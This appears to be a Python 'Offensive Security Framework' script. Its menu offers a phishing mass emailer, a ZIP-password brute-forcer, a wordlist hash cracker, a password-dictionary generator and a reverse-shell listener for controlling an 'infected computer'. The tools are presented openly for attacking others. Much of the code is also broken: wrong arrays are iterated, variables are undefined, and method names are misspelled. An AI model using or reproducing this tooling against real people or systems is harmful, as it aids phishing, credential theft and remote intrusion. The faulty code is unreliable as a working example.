#Offensive Security Framework
#Made by Christian Krenzlin, Co-Founder of MonoSec
#Special Thanks to Albert Slepak for his help
import interface
import itertools
import math
import hashlib
import sys
import smtplib
import time
import getpass
import itertools
import zipfile
import socket
import os
import json
import requests
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


arr = ["Social Engineering  A collection of Social Engineering tools, including Phishing email producer, email spoofer, and many more","",
 "Dictionary Creation You can enter an array of words and/or numbers and the algorithm will create a list of all possible passwords created with those words and save it into your specified file path","",
 "Bruteforcing tool   A bruteforcing tool that's designed to both bruteforce local files, such as password protected ZIP files, it can also bruteforce supported email services","",
 "Reverse Shell       Allows you to create a reverse tcp shell in order to keep a connection to the infected computer","",
 "Hash Cracking       This takes a different approach to cracking passwords. If you have a password hash from somewhere, and you'd like to know what the password is, but it may be in a one-way algorithm, you can use this with an attached wordlist to bruteforce the hash",
]



arr1 = ["a"]

#help menu
def OffsecHelpmenu():
    print("welcome to the help menu")
    print()
    for i in range(0,len(arr)):
        print(arr[i])


#command line menu
def OffsecMenu():
    print()
    print("Welcome to the world of Offensive Security:")
    print("1. Social Engineering")
    print("2. Dictionary Creation")
    print("3. Bruteforcing tool")
    #TODO add a reverse shell
    print("4. Reverse shell")
    print("5. Hash cracking")
    print("88. Help")
    print("99. Exit")
    x = int(input("What option would you like to choose? "))
    if(x == 1):
        SocialEngineering()
    elif(x == 2):
        Dictionary()
    elif(x == 3):
        Brute()
    elif(x == 4):
        Reverse_Shell()
    elif(x == 5):
        HashCrack()
    elif(x == 88):
        OffsecHelpmenu()
        OffsecMenu()
    elif(x == 99):
        exit()

def geolocation():
    ip = input("Enter the IP you want to search for: ")
    r = requests.get("https://www.ipinfo.io/"+ip+"/geo")
    ret = r.text
    parsed = json.loads(ret)
    print()
    print("Here are the results")
    print("City: "+parsed["city"])
    print("Region: "+parsed["region"])
    print("Country: "+parsed["country"])


#social engienrring sub menu
def SocialEngineering():
    print("Welcome to the Social Engineering area of MSF")
    print("1. Phishing emails")
    print("2. Email spoofing")
    print("3. Malicious payload generator (?)")
    print("4. Mass emailer")
    print("5. IP Geolocation")

    x = int(input("Enter the number of your option: "))
    if(x == 1):
        print("PE")
    elif(x==2):
        print("ES")
    elif(x==3):
        print("MP")
    elif(x==4):
        print("ME")
        MassEmailer()
    elif(x == 5):
        geolocation()
#Outline for a mass emailer. Will add sender spoofing
def MassEmailer():
    list = input("Enter the filename for the email list")
    with open(list) as f:
        lines = [line.rstrip('\n') for line in open(list)]
    for i in lines:
        arr1.append(i)
    sender = input("Enter the sender address: ")
    provider = input("Enter the provider here: ")
    subject = input("Enter the subject of the email: ")
    prov_port = int(input("Enter the smtp port number for your provider: "))
    password = getpass.getpass()
    s = smtplib.SMTP(host=provider, port=prov_port)
    s.starttls()
    try:
        s.login(sender,password)
    except smtplib.SMTPException:
        print("Something went wrong....")
        time.sleep(1)
        MassEmailer()
    #message creation
    message = input("Enter the message body: ")
    for email in arr1:
        msg = MIMEMultipart()
        msg['From']=sender
        msg['To']=to
        msg['Subject']=subject

    # add in the message body
        msg.attach(MIMEText(message, 'plain'))

    # send the message via the server set up earlier.
        s.send_message(msg)
        del msg
    s.quit()


def Dictionary():
    print("You chose the dictionary creation tool. With this tool, you can create a password dictionary with just a few base words")
    while True:
        try:
            list = input("Input your list name (has to be in the same directory as this): ")
            with open(list) as f:
                x = [line.rstrip('\n') for line in open(list)]
            break
        except OSError:
            print("This file cannot be opened")
    print()
    idx = int(input("How many words would you want combined?(max 4): "))
    while(idx > 4 or idx < 1 ):
        idx = int(input("How many words would you want combined?(max 4): "))
    dictExec(list,idx)
#Creates a password dictionary based off of wordlist with variable passsword depth
def dictExec(list,idx):
    arr1.remove("a")
    x = 0
    with open(list) as f:
        lines = [line.rstrip('\n') for line in open(list)]
    for i in lines:
        print(str(x)+": "+i)
        arr1.append(i)
        x+=1
    print()
    print("Post value listing")
    print()
    y = 0
    if(idx == 2):
        for y in range(len(arr)):
            for i in range(len(arr)):
                print(arr[y] + arr[i])
    elif(idx == 3):
        for y in range(len(arr)):
            for i in range(len(arr)):
                for x in range(len(arr)):
                    print(arr[y]+arr[i]+arr[x])
    elif(idx == 4):
        for y in range(len(arr)):
            for i in range(len(arr)):
                for x in range(len(arr)):
                    for z in range(len(arr)):
                        print(arr[y]+arr[i]+arr[x]+arr[z])


def Brute():
    print("Welcome to the Bruteforce menu")
    print()
    print("1. Email bruteforce")
    print("2. ZIP bruteforce")
    x = int(input("Enter the number of your choice: "))
    if(x == 1):
        bfEmail()
    if(x == 2):
        bfZip()
#email brutefocing, will use proxies to bypass captchas (?)
def bfEmail():
    print()


#Shits broken my dude
#Dictionary attack to break .zip file passwords
def bfZip():
    pass_array = []
    print("zip and dictionary file have to be in the same directory as this")
    zip = input("Enter the name of your zip file: ")
    dict = input("Enter the name of your dictionary: ")
    with zipfile.ZipFile(zip, 'r') as zf:
        print(zf.namelist())
        for filename in zf.namelist():
            with open(dict) as f:
                x = [line.rstrip('\n') for line in open(dict)]
            for pw in x:
                try:
                    zf.extractall(pwd=bytes(pw,'utf-8'))
                    print("Password found: "+pw)
                except:
                    print("Wrong password: "+pw)




#reverse shell Creation

def Reverse_Shell():
    def cSocket():
        try:
            global host
            global property
            global s
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host = ""
            port = int(input("Enter the listener port: "))
            if port == "":
                cSocket()
        except socket.error as m:
            print("Socket error: "+str(m[0]))
    def bindSocket():
        try:
            print("Binding at port %s" %port)
            s.bind((host,port))
            s.listen(1)
        except socket.error as m:
            print("Socket error: "+str(m[0]))
            bindSocket()
    def aSocket():
        global c
        global a
        global h
        try:
            c,a = s.accpet()
            print("[!!!] Session is open at %s:%s" %(a[0],a[1]))
            print("\n")
            h = c.recv(1024)
            menu()
        except socket.error as m:
            print("Socket error: "+str(m[0]))
    def menu():
        while 9:
            cmd = input(str(a[0]) + "@" + str(h) + ">")
            if cmd == "exit":
                c.close()
                s.close()
                sys.exit()
            command = c.send(cmd)
            result = c.recv(16834)
            if result != hostname:
                print (result)
    def main():
        cSocket()
        bindSocket()
        aSocket()
    main()

#Inner menu for the hash cracker
def HashCrack():
    print("You chose the hash cracking tool. With this tool, you'll be able to reverse check hashes in order to crack hashed passwords")
    list = input("Input your list name (has to be in the same directory as this): ")
    hash = input("Enter the hash you want cracked: ")
    print()
    print("Available Algorithms:")
    print("1. md5")
    print("2. sha1")
    print("3. sha256")
    print("4. sha224")
    print("5. sha384")
    print("6. sha512")
    algorithm = int(input("Enter the number of the correct hashing algorithm: "))
    crackExec(list,hash,algorithm)

#Hash cracking by comparing hash values from word lists. Effective against 1 way hashes like SHA2 and SHA3
def crackExec(list,hash,algorithm):
    arr1.remove("a")
    sentinel = hash
    with open(list) as f:
        lines = [line.rstrip('\n') for line in open(list)]
    for i in lines:
        arr1.append(i)
    if(algorithm == 1):
        found = False
        for i in range(len(arr)):
            m = hashlib.md5(arr[i].encode())
            if(m.hexdigest() == hash):
                print("The hash was found.The password is: "+arr[i])
                found = True
                break
        if(not found):
            print("No passwords matched")

    elif(algorithm == 2):
        found = False
        for i in range(len(arr)):
            m = hashlib.sha1(arr[i].encode())
            if(m.hexdigest() == hash):
                print("The hash was found.The password is: "+arr[i])
                found = True
                break
        if(not found):
            print("No passwords matched")
    elif(algorithm == 3):
        found = False
        for i in range(len(arr)):
            m = hashlib.sha256(arr[i].encode())
            if(m.hexdigest() == hash):
                print("The hash was found.The password is: "+arr[i])
                found = True
                break
        if(not found):
            print("No passwords matched")

    elif(algorithm == 4):
        found = False
        for i in range(len(arr)):
            m = hashlib.sha224(arr[i].encode())
            if(m.hexdigest() == hash):
                print("The hash was found.The password is: "+arr[i])
                found = True
                break
        if(not found):
            print("No passwords matched")
    elif(algorithm == 5):
        found = False
        for i in range(len(arr)):
            m = hashlib.sha384(arr[i].encode())
            if(m.hexdigest() == hash):
                print("The hash was found.The password is: "+arr[i])
                found = True
                break
        if(not found):
            print("No passwords matched")
    elif(algorithm == 6):
        found = False
        for i in range(len(arr)):
            m = hashlib.sha512(arr[i].encode())
            if(m.hexdigest() == hash):
                print("The hash was found.The password is: "+arr[i])
                found = True
                break
        if(not found):
            print("No passwords matched")
    else:
        print("Not a valid option")
        HashCrack()

OffsecMenu()
